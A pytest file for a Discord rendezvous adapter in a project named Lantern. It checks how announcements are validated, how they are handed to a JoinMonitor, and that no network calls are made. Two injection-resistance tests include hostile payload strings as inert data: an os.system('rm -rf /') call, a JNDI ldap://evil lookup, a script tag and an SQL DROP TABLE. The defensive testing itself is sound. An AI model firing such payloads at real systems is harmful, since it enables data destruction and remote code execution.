"""Tests for src/lantern/discord_rendezvous.py.

Part 1 (Phase 3B): pure normalization/validation. Every test here operates
purely on in-memory dict payloads. No network socket, no Discord API, no
HTTP server, and no other Lantern module (core, rendezvous, participants,
identity, bootstrap_node) is imported or touched -- this section verifies
the adapter is genuinely free-standing pure normalization/validation logic.

Part 2 (Phase 3C): JoinMonitor integration, added at the bottom of this
file. These tests DO import rendezvous.JoinMonitor -- that is the one
explicitly authorized dependency for this phase -- and use a real,
tempdir-backed JoinMonitor/Chronicle exactly as existing rendezvous tests
do. Nothing else (identity, participants, handshake, bootstrap_node, core)
is imported here either.
"""

from __future__ import annotations

import copy
import json
import socket
from datetime import datetime, timedelta, timezone

import pytest

from lantern.discord_rendezvous import (
    DiscordRendezvousResult,
    NormalizedAnnouncement,
    normalize_discord_announcement,
    submit_discord_announcement,
)
from lantern.rendezvous import AWAITING_HANDSHAKE, JoinMonitor


VALID_PUBLIC_KEY = "a" * 64  # syntactically valid 64-char hex Ed25519 key shape


def _iso(dt: datetime) -> str:
    return dt.isoformat()


def _valid_fields(**overrides) -> dict:
    now = datetime.now(timezone.utc)
    fields = {
        "rendezvous_version": "1",
        "announcement_id": "ann-0001",
        "node_id": "lantern-a",
        "protocol_version": "0.82",
        "public_key": VALID_PUBLIC_KEY,
        "capabilities": {"evidence_exchange": True, "identity_proof": True},
        "endpoint": "http://198.51.100.10:8765",
        "issued_at": _iso(now),
        "expires_at": _iso(now + timedelta(minutes=30)),
    }
    fields.update(overrides)
    return fields


def _discord_payload(fields: dict | None, **payload_overrides) -> dict:
    """Wrap rendezvous fields the way a real Discord message would: as a
    fenced JSON code block inside a normal message `content` string."""
    content = None
    if fields is not None:
        content = "Announcing a Lantern node:\n```json\n" + json.dumps(fields) + "\n```\nContact welcome."
    payload = {
        "id": "999888777",
        "channel_id": "111222333",
        "guild_id": "444555666",
        "author": {"id": "777666555"},
        "content": content,
    }
    payload.update(payload_overrides)
    return payload


# ---------------------------------------------------------------------------
# Valid announcement
# ---------------------------------------------------------------------------

def test_valid_announcement_normalizes_successfully():
    payload = _discord_payload(_valid_fields())
    result = normalize_discord_announcement(payload)

    assert isinstance(result, NormalizedAnnouncement)
    assert result.valid is True
    assert result.rejection_reason is None
    assert result.announcement_id == "ann-0001"
    assert result.node_id == "lantern-a"
    assert result.protocol_version == "0.82"
    assert result.claimed_public_key == VALID_PUBLIC_KEY
    assert result.claimed_capabilities == {"evidence_exchange": True, "identity_proof": True}
    assert result.claimed_endpoint == "http://198.51.100.10:8765"
    assert result.expires_at is not None


def test_valid_announcement_produces_correct_join_request_payload():
    payload = _discord_payload(_valid_fields())
    result = normalize_discord_announcement(payload)
    join_payload = result.to_join_request_payload()

    assert join_payload == {
        "request_id": "ann-0001",
        "node_id": "lantern-a",
        "protocol_version": "0.82",
        "capabilities": {"evidence_exchange": True, "identity_proof": True},
        "timestamp": result.issued_at,
        "peer_endpoint": "http://198.51.100.10:8765",
    }


def test_valid_announcement_without_endpoint_is_accepted():
    fields = _valid_fields()
    del fields["endpoint"]
    payload = _discord_payload(fields)
    result = normalize_discord_announcement(payload)

    assert result.valid is True
    assert result.claimed_endpoint is None


# ---------------------------------------------------------------------------
# Missing required fields
# ---------------------------------------------------------------------------

def test_missing_node_id_is_rejected():
    fields = _valid_fields()
    del fields["node_id"]
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "node_id" in result.rejection_reason


def test_missing_announcement_id_is_rejected():
    fields = _valid_fields()
    del fields["announcement_id"]
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "announcement_id" in result.rejection_reason


def test_missing_protocol_version_is_rejected():
    fields = _valid_fields()
    del fields["protocol_version"]
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "protocol_version" in result.rejection_reason


def test_missing_public_key_is_rejected():
    fields = _valid_fields()
    del fields["public_key"]
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "public_key" in result.rejection_reason


def test_missing_rendezvous_version_is_rejected():
    fields = _valid_fields()
    del fields["rendezvous_version"]
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False


def test_unsupported_rendezvous_version_is_rejected():
    fields = _valid_fields(rendezvous_version="99")
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "rendezvous_version" in result.rejection_reason


# ---------------------------------------------------------------------------
# Malformed timestamps
# ---------------------------------------------------------------------------

def test_malformed_issued_at_timestamp_is_rejected():
    fields = _valid_fields(issued_at="not-a-timestamp")
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "issued_at" in result.rejection_reason


def test_malformed_expires_at_timestamp_is_rejected():
    fields = _valid_fields(expires_at="definitely-not-iso8601")
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "expires_at" in result.rejection_reason


def test_expires_at_before_issued_at_is_rejected():
    now = datetime.now(timezone.utc)
    fields = _valid_fields(issued_at=_iso(now), expires_at=_iso(now - timedelta(minutes=5)))
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "expires_at" in result.rejection_reason


# ---------------------------------------------------------------------------
# Expired announcement
# ---------------------------------------------------------------------------

def test_expired_announcement_is_rejected():
    now = datetime.now(timezone.utc)
    fields = _valid_fields(
        issued_at=_iso(now - timedelta(hours=2)),
        expires_at=_iso(now - timedelta(hours=1)),
    )
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "expired" in result.rejection_reason


def test_announcement_without_expires_at_is_not_rejected_for_expiry():
    fields = _valid_fields()
    del fields["expires_at"]
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is True
    assert result.expires_at is None


# ---------------------------------------------------------------------------
# Malformed endpoint
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "bad_endpoint",
    [
        "not-a-url-at-all",
        "ftp://198.51.100.10:8765",
        "javascript:alert(1)",
        "http://",
        "http:///no-host",
        "",
    ],
)
def test_malformed_endpoint_is_rejected(bad_endpoint):
    fields = _valid_fields(endpoint=bad_endpoint)
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "endpoint" in result.rejection_reason


def test_endpoint_present_as_peer_endpoint_alias_is_accepted():
    fields = _valid_fields()
    del fields["endpoint"]
    fields["peer_endpoint"] = "https://example-lantern-node.invalid:8765"
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is True
    assert result.claimed_endpoint == "https://example-lantern-node.invalid:8765"


# ---------------------------------------------------------------------------
# node_id / public-key mismatch scenarios
# ---------------------------------------------------------------------------
#
# The adapter has no way to know what public key SHOULD be bound to a given
# node_id (that binding check is identity.verify_binding()'s job, not this
# module's -- this module never imports identity.py). What it CAN and must
# do is reject a public_key value that is not even syntactically plausible,
# and it must never silently substitute or "correct" a mismatched claim --
# every field is carried through verbatim as an untrusted claim, unmodified.

def test_syntactically_invalid_public_key_is_rejected():
    fields = _valid_fields(public_key="not-hex-at-all")
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "public_key" in result.rejection_reason


def test_wrong_length_public_key_is_rejected():
    fields = _valid_fields(public_key="ab" * 10)  # valid hex, wrong length
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "public_key" in result.rejection_reason


def test_different_node_id_same_public_key_both_pass_through_as_claims():
    """The adapter must not reject or reconcile two announcements that
    reuse the same public_key under different node_ids -- that is a
    legitimate cross-cutting security question for identity verification
    (public-key substitution / trust-on-first-use pinning), not something
    this pure normalization layer can or should adjudicate."""
    fields_a = _valid_fields(node_id="lantern-a", announcement_id="ann-a")
    fields_b = _valid_fields(node_id="lantern-b", announcement_id="ann-b", public_key=fields_a["public_key"])

    result_a = normalize_discord_announcement(_discord_payload(fields_a))
    result_b = normalize_discord_announcement(_discord_payload(fields_b))

    assert result_a.valid is True
    assert result_b.valid is True
    assert result_a.claimed_public_key == result_b.claimed_public_key
    assert result_a.node_id != result_b.node_id


# ---------------------------------------------------------------------------
# Malformed / non-announcement payloads
# ---------------------------------------------------------------------------

def test_non_dict_payload_is_rejected():
    result = normalize_discord_announcement("just a string, not a dict")

    assert result.valid is False
    assert result.rejection_reason == "payload is not a dict"


def test_payload_with_no_rendezvous_content_is_rejected():
    payload = _discord_payload(None, content="just chatting, no announcement here")
    result = normalize_discord_announcement(payload)

    assert result.valid is False
    assert "no structured rendezvous announcement" in result.rejection_reason


def test_payload_with_garbage_json_in_code_block_is_rejected():
    payload = _discord_payload(None, content="```json\n{not valid json!!\n```")
    result = normalize_discord_announcement(payload)

    assert result.valid is False


def test_payload_with_json_array_instead_of_object_is_rejected():
    payload = _discord_payload(None, content="```json\n[1, 2, 3]\n```")
    result = normalize_discord_announcement(payload)

    assert result.valid is False


def test_capabilities_with_non_boolean_values_is_rejected():
    fields = _valid_fields(capabilities={"evidence_exchange": "yes"})
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is False
    assert "capabilities" in result.rejection_reason


def test_pre_extracted_rendezvous_dict_is_supported():
    """Supports payload['rendezvous'] already being a dict (e.g. a test
    harness or a future structured-embed convention), not only the
    fenced-code-block-in-content shape."""
    fields = _valid_fields()
    payload = {
        "id": "1",
        "channel_id": "2",
        "author": {"id": "3"},
        "content": None,
        "rendezvous": fields,
    }
    result = normalize_discord_announcement(payload)

    assert result.valid is True
    assert result.node_id == fields["node_id"]


# ---------------------------------------------------------------------------
# Discord metadata preservation
# ---------------------------------------------------------------------------

def test_discord_metadata_is_preserved_on_valid_announcement():
    payload = _discord_payload(_valid_fields())
    result = normalize_discord_announcement(payload)

    assert result.discord_metadata["platform"] == "discord"
    assert result.discord_metadata["discord_message_id"] == "999888777"
    assert result.discord_metadata["discord_channel_id"] == "111222333"
    assert result.discord_metadata["discord_guild_id"] == "444555666"
    assert result.discord_metadata["discord_author_id"] == "777666555"
    assert result.discord_metadata["discord_content_excerpt"] is not None


def test_discord_metadata_is_preserved_even_on_rejected_announcement():
    fields = _valid_fields()
    del fields["node_id"]
    payload = _discord_payload(fields)
    result = normalize_discord_announcement(payload)

    assert result.valid is False
    assert result.discord_metadata["discord_message_id"] == "999888777"


def test_missing_author_produces_none_author_id_not_a_crash():
    payload = _discord_payload(_valid_fields())
    del payload["author"]
    result = normalize_discord_announcement(payload)

    assert result.valid is True
    assert result.discord_metadata["discord_author_id"] is None


# ---------------------------------------------------------------------------
# Arbitrary message text remains inert (prompt-injection resistance)
# ---------------------------------------------------------------------------

def test_arbitrary_message_text_is_never_executed_or_interpreted():
    """A hostile message body attempting command/code injection must be
    treated as inert text -- at most captured verbatim in
    discord_metadata, never executed, never used to alter control flow,
    never able to change node_id/announcement_id/capabilities."""
    fields = _valid_fields()
    hostile_content = (
        "Announcing:\n```json\n"
        + json.dumps(fields)
        + "\n```\n"
        + "__import__('os').system('rm -rf /'); {{7*7}}; ${jndi:ldap://evil/a}; "
        + "<script>alert(1)</script>; '; DROP TABLE participants; --"
    )
    payload = _discord_payload(None, content=hostile_content)
    result = normalize_discord_announcement(payload)

    assert result.valid is True
    assert result.node_id == fields["node_id"]
    assert result.announcement_id == fields["announcement_id"]
    # The hostile text is at most stored as an inert, truncated string.
    assert isinstance(result.discord_metadata["discord_content_excerpt"], str)
    assert "rm -rf" not in result.node_id
    assert "DROP TABLE" not in result.announcement_id


def test_hostile_field_values_are_carried_as_inert_strings_not_executed():
    """Even if an attacker puts script-like text INSIDE a structured
    field value (e.g. node_id), it must pass through as an inert string,
    never evaluated -- this module has no eval/exec/import-by-string
    anywhere in its code path."""
    fields = _valid_fields(node_id="__import__('os').system('echo pwned')")
    payload = _discord_payload(fields)
    result = normalize_discord_announcement(payload)

    assert result.valid is True
    assert result.node_id == "__import__('os').system('echo pwned')"


def test_capabilities_cannot_smuggle_extra_untrusted_privilege_keys():
    """capabilities is carried through as claimed data only -- this
    adapter does not grant, merge, or apply it to any local capability
    set. (Enforcement that it is *treated* as untrusted happens in the
    integration layer, out of scope here; this test only confirms the
    adapter does not silently drop or alter the claimed dict.)"""
    fields = _valid_fields(capabilities={"codex_update": True, "identity_proof": True})
    result = normalize_discord_announcement(_discord_payload(fields))

    assert result.valid is True
    assert result.claimed_capabilities == {"codex_update": True, "identity_proof": True}


# ---------------------------------------------------------------------------
# Deterministic normalization
# ---------------------------------------------------------------------------

def test_normalization_is_deterministic_for_identical_input():
    payload = _discord_payload(_valid_fields())
    payload_copy = copy.deepcopy(payload)

    result_1 = normalize_discord_announcement(payload)
    result_2 = normalize_discord_announcement(payload_copy)

    assert result_1 == result_2


def test_normalization_does_not_mutate_input_payload():
    payload = _discord_payload(_valid_fields())
    original = copy.deepcopy(payload)

    normalize_discord_announcement(payload)

    assert payload == original


# ---------------------------------------------------------------------------
# No network calls occur
# ---------------------------------------------------------------------------

def test_no_network_calls_occur_during_normalization(monkeypatch):
    """Patch socket.socket / socket.create_connection / socket.getaddrinfo
    to raise if ever invoked -- proves the adapter performs zero network
    activity, including DNS resolution, for both valid and hostile input."""

    def _forbidden(*args, **kwargs):
        raise AssertionError("discord_rendezvous adapter attempted network access")

    monkeypatch.setattr(socket, "socket", _forbidden)
    monkeypatch.setattr(socket, "create_connection", _forbidden)
    monkeypatch.setattr(socket, "getaddrinfo", _forbidden)

    valid_payload = _discord_payload(_valid_fields())
    result_valid = normalize_discord_announcement(valid_payload)
    assert result_valid.valid is True

    hostile_payload = _discord_payload(_valid_fields(endpoint="http://198.51.100.99:9999"))
    result_hostile = normalize_discord_announcement(hostile_payload)
    assert result_hostile.valid is True
    # Even with a plausible-looking endpoint present, no contact was made
    # -- the monkeypatched socket functions above would have raised.

    malformed_payload = _discord_payload(None, content="not an announcement")
    result_malformed = normalize_discord_announcement(malformed_payload)
    assert result_malformed.valid is False


# ---------------------------------------------------------------------------
# Phase 3C: JoinMonitor integration
#
# submit_discord_announcement() is the only function under test in this
# section. It is the sole bridge between normalization and the EXISTING
# rendezvous.JoinMonitor -- these tests confirm the wiring is correct
# without re-testing JoinMonitor's own dedup/TTL/persistence logic (that
# remains covered by tests/test_lantern_rendezvous.py, unchanged).
# ---------------------------------------------------------------------------

def test_valid_announcement_reaches_joinmonitor(tmp_path):
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    payload = _discord_payload(_valid_fields())

    result = submit_discord_announcement(payload, monitor)

    assert isinstance(result, DiscordRendezvousResult)
    assert result.submitted is True
    assert result.normalized.valid is True
    assert result.join_request is not None
    assert result.is_new is True
    assert result.notification is not None
    assert len(monitor.pending()) == 1


def test_resulting_join_request_has_correct_fields(tmp_path):
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    fields = _valid_fields()
    payload = _discord_payload(fields)

    result = submit_discord_announcement(payload, monitor)

    join_request = result.join_request
    assert join_request.request_id == fields["announcement_id"]
    assert join_request.node_id == fields["node_id"]
    assert join_request.protocol_version == fields["protocol_version"]
    assert join_request.capabilities == fields["capabilities"]
    assert join_request.peer_endpoint == fields["endpoint"]
    assert join_request.timestamp == fields["issued_at"]
    assert join_request.status == AWAITING_HANDSHAKE


def test_invalid_announcement_never_reaches_joinmonitor(tmp_path):
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    fields = _valid_fields()
    del fields["node_id"]
    payload = _discord_payload(fields)

    result = submit_discord_announcement(payload, monitor)

    assert result.submitted is False
    assert result.normalized.valid is False
    assert result.join_request is None
    assert result.is_new is None
    assert result.notification is None
    # JoinMonitor was never touched: no pending requests, no Chronicle
    # entries at all -- submit() was structurally never called.
    assert monitor.pending() == []
    assert monitor.all_requests() == []
    assert not (tmp_path / "joins.jsonl").exists()


def test_malformed_payload_never_reaches_joinmonitor(tmp_path):
    monitor = JoinMonitor(tmp_path / "joins.jsonl")

    result = submit_discord_announcement("not even a dict", monitor)

    assert result.submitted is False
    assert monitor.pending() == []


def test_duplicate_announcement_handled_by_existing_joinmonitor_dedup(tmp_path):
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    fields = _valid_fields()
    payload = _discord_payload(fields)

    first = submit_discord_announcement(payload, monitor)
    second = submit_discord_announcement(payload, monitor)

    assert first.submitted is True
    assert first.is_new is True
    assert second.submitted is True
    assert second.is_new is False
    # JoinMonitor's existing dedup: still exactly one pending request, not two.
    assert len(monitor.pending()) == 1
    assert second.join_request.request_id == first.join_request.request_id


def test_ttl_remains_controlled_by_joinmonitor(tmp_path):
    """This module does not compute or enforce TTL/expiry itself once a
    payload reaches JoinMonitor -- JoinMonitor.submit() recomputes
    expires_at from its own ttl_seconds, ignoring/overwriting any
    expires_at the Discord announcement claimed. This test confirms that
    behavior is untouched by going through submit_discord_announcement()
    with an extremely short monitor TTL."""
    monitor = JoinMonitor(tmp_path / "joins.jsonl", ttl_seconds=0.0)
    fields = _valid_fields()
    payload = _discord_payload(fields)

    result = submit_discord_announcement(payload, monitor)
    assert result.submitted is True
    assert result.join_request.request_id in monitor.requests

    # With ttl_seconds=0.0, the very next expire() pass (triggered by
    # pending()/all_requests()) should move it to EXPIRED -- proving TTL
    # enforcement is entirely JoinMonitor's, not this module's.
    assert monitor.pending() == []
    expired = [r for r in monitor.all_requests() if r.request_id == result.join_request.request_id]
    assert len(expired) == 1
    assert expired[0].status != AWAITING_HANDSHAKE


def test_discord_metadata_remains_available_to_caller_after_submission(tmp_path):
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    payload = _discord_payload(_valid_fields())

    result = submit_discord_announcement(payload, monitor)

    assert result.normalized.discord_metadata["platform"] == "discord"
    assert result.normalized.discord_metadata["discord_message_id"] == "999888777"
    assert result.normalized.discord_metadata["discord_channel_id"] == "111222333"
    # JoinMonitor's own JoinRequest object has no discord_metadata field --
    # this module deliberately does not stuff it into JoinRequest (no
    # JoinRequest schema change); the metadata is only ever available via
    # result.normalized, the caller's own untrusted-normalization view.
    assert not hasattr(result.join_request, "discord_metadata")


def test_no_network_calls_occur_during_joinmonitor_submission(tmp_path, monkeypatch):
    def _forbidden(*args, **kwargs):
        raise AssertionError("discord_rendezvous integration attempted network access")

    monkeypatch.setattr(socket, "socket", _forbidden)
    monkeypatch.setattr(socket, "create_connection", _forbidden)
    monkeypatch.setattr(socket, "getaddrinfo", _forbidden)

    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    payload = _discord_payload(_valid_fields(endpoint="http://198.51.100.50:8765"))

    result = submit_discord_announcement(payload, monitor)

    assert result.submitted is True
    # peer_endpoint was recorded as an untrusted claim only -- it was
    # never dialed, even though it looks like a plausible reachable host.
    assert result.join_request.peer_endpoint == "http://198.51.100.50:8765"


def test_no_identity_verification_occurs_during_submission(tmp_path):
    """submit_discord_announcement() must never produce, touch, or import
    anything from identity.py. The clearest structural proof: the
    resulting JoinRequest carries no identity_status/verification field at
    all -- identity verification is a wholly separate, later step this
    function never performs."""
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    payload = _discord_payload(_valid_fields())

    result = submit_discord_announcement(payload, monitor)

    join_request_dict = result.join_request.to_dict()
    assert "identity_status" not in join_request_dict
    assert "verified" not in join_request_dict
    assert "trust_status" not in join_request_dict
    assert "authority_level" not in join_request_dict
    assert join_request_dict["status"] == AWAITING_HANDSHAKE


def test_no_participant_trust_or_authority_state_changes(tmp_path):
    """No ParticipantView is created and no trust/authority state exists
    anywhere reachable from this call -- submit_discord_announcement()
    only ever touches JoinMonitor's own requests dict/Chronicle, nothing
    resembling a participant registry, trust store, or authority table."""
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    payload = _discord_payload(_valid_fields())

    submit_discord_announcement(payload, monitor)

    assert not hasattr(monitor, "participants")
    assert not hasattr(monitor, "trust_status")
    assert not hasattr(monitor, "authority_level")


def test_persisted_verification_matches_existing_joinmonitor_behavior(tmp_path):
    """verify_persisted() is JoinMonitor's own durability check
    (re-reads the Chronicle from disk, not the in-memory cache) --
    confirming it works correctly for a Discord-sourced submission proves
    this integration did not bypass JoinMonitor's durable-write path."""
    monitor = JoinMonitor(tmp_path / "joins.jsonl")
    payload = _discord_payload(_valid_fields())

    result = submit_discord_announcement(payload, monitor)

    assert monitor.verify_persisted(result.join_request.request_id) is True
